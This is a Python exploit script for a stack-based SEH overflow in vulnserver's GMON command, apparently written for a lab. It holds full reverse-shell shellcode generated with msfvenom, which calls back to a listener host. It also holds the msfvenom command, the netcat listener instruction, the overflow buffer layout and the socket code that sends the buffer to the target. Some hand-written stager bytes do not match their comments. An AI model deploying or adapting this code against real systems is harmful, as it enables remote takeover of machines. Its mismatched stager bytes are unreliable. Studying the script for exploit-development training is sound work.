#!/usr/bin/env python2.7

#importing modules
import socket

#buffer overflow vulnerability in GMON command of vulnserver
#Exploit is SEH based

#SEH handler overwritten at 3498 bytes
#buffer = junk + nSEH + SEH + more junk
#SEH = CCCC
#nSEH = BBBB
#more junk = DDDD
#we need to write seh with a pop pop ret to make execution go to nseh (seh is at esp+8)
#hence two pops (each reduce stack by 4 bytes) and ret will make esp point to beginning of nseh
#overwrite nseh with a short jump to D's


#Exploit's working:

#################################################################################################
# HIT --> SEH --> POP - POP - RET								
# ESP --> nSEH											
# nSEH --> JMP SHORT to DDDD aka "more junk" [1st stage]					
# At "more junk" area write assembly to jump to "A"s as D's 34 bytes long			
# --> [2nd Stager logic below]									
# Second stager at D's to make EIP point to somewhere in long "A"s				
# Second Stager logic :										
# mov eax, [esp]	#move value of ESP to EAX						
# add EAX, 0xb72	#add value in EAX such that it points to a suitable location in "A"s	
# push EAX		#move this modified value to stack					
# retn			#pop this value from stack onto EIP					
# Now, EIP ponts to a safely long buffer in "A"s						
# Write msfvenom shellcode [3rd stager]	and gain shell						
#################################################################################################

#[3rd Stager]
#Payload generated via metasploit
#Only badchar is \x00
#msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.132 lport=443 -b "\x00" -f python
#Dont forget to do nc -nlvp 443 before you use this exploit so as to recieve the shell :)
buf =  ""
buf += "\xd9\xcc\xd9\x74\x24\xf4\x5a\x33\xc9\xbb\xf9\xd6\x55"
buf += "\x0b\xb1\x52\x83\xc2\x04\x31\x5a\x13\x03\xa3\xc5\xb7"
buf += "\xfe\xaf\x02\xb5\x01\x4f\xd3\xda\x88\xaa\xe2\xda\xef"
buf += "\xbf\x55\xeb\x64\xed\x59\x80\x29\x05\xe9\xe4\xe5\x2a"
buf += "\x5a\x42\xd0\x05\x5b\xff\x20\x04\xdf\x02\x75\xe6\xde"
buf += "\xcc\x88\xe7\x27\x30\x60\xb5\xf0\x3e\xd7\x29\x74\x0a"
buf += "\xe4\xc2\xc6\x9a\x6c\x37\x9e\x9d\x5d\xe6\x94\xc7\x7d"
buf += "\x09\x78\x7c\x34\x11\x9d\xb9\x8e\xaa\x55\x35\x11\x7a"
buf += "\xa4\xb6\xbe\x43\x08\x45\xbe\x84\xaf\xb6\xb5\xfc\xd3"
buf += "\x4b\xce\x3b\xa9\x97\x5b\xdf\x09\x53\xfb\x3b\xab\xb0"
buf += "\x9a\xc8\xa7\x7d\xe8\x96\xab\x80\x3d\xad\xd0\x09\xc0"
buf += "\x61\x51\x49\xe7\xa5\x39\x09\x86\xfc\xe7\xfc\xb7\x1e"
buf += "\x48\xa0\x1d\x55\x65\xb5\x2f\x34\xe2\x7a\x02\xc6\xf2"
buf += "\x14\x15\xb5\xc0\xbb\x8d\x51\x69\x33\x08\xa6\x8e\x6e"
buf += "\xec\x38\x71\x91\x0d\x11\xb6\xc5\x5d\x09\x1f\x66\x36"
buf += "\xc9\xa0\xb3\x99\x99\x0e\x6c\x5a\x49\xef\xdc\x32\x83"
buf += "\xe0\x03\x22\xac\x2a\x2c\xc9\x57\xbd\x93\xa6\x6f\xb9"
buf += "\x7c\xb5\x8f\xc0\xc7\x30\x69\xa8\x27\x15\x22\x45\xd1"
buf += "\x3c\xb8\xf4\x1e\xeb\xc5\x37\x94\x18\x3a\xf9\x5d\x54"
buf += "\x28\x6e\xae\x23\x12\x39\xb1\x99\x3a\xa5\x20\x46\xba"
buf += "\xa0\x58\xd1\xed\xe5\xaf\x28\x7b\x18\x89\x82\x99\xe1"
buf += "\x4f\xec\x19\x3e\xac\xf3\xa0\xb3\x88\xd7\xb2\x0d\x10"
buf += "\x5c\xe6\xc1\x47\x0a\x50\xa4\x31\xfc\x0a\x7e\xed\x56"
buf += "\xda\x07\xdd\x68\x9c\x07\x08\x1f\x40\xb9\xe5\x66\x7f"
buf += "\x76\x62\x6f\xf8\x6a\x12\x90\xd3\x2e\x22\xdb\x79\x06"
buf += "\xab\x82\xe8\x1a\xb6\x34\xc7\x59\xcf\xb6\xed\x21\x34"
buf += "\xa6\x84\x24\x70\x60\x75\x55\xe9\x05\x79\xca\x0a\x0c"

#[1st Stager] <<nSEH value>>
#JMP SHORT to beginning of D's
#Fill nSEH [Total : 4 bytes] with JMP SHORT [2 bytes] and NOPs [2 bytes]
#nSEH = \xeb\x06\x90\x90

#[2nd Stager] <<custom shellcode at D's to jump back to A's which has space to accomodate shellcode>>
#\x8b\x04\x24	--> mov eax, [esp]
#\x66\x05\72	--> add eax, 0xb72
#\x0b\x50	--> push eax
#\xc3		--> ret

#POP-POP-RET addess from essfunc.dll
#\xb4\x10\x50\x62

#complete exploit buffer
buffer = "A"*2128 + buf + "A"* ( 3498 - (2128 + len(buf)) ) + "\xeb\x06\x90\x90" + "\xb4\x10\x50\x62" + "\x8b\x04\x24\x66\x05\72\x0b\x50\xc3"  + "D" * (6000 - 3506)

#buffer has to begin with "/" character to trigger the vulnerability
cmd = "GMON /" + buffer

#send exploit to victim
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.128",9999))
s.recv(1024)
s.send(cmd)
s.close()
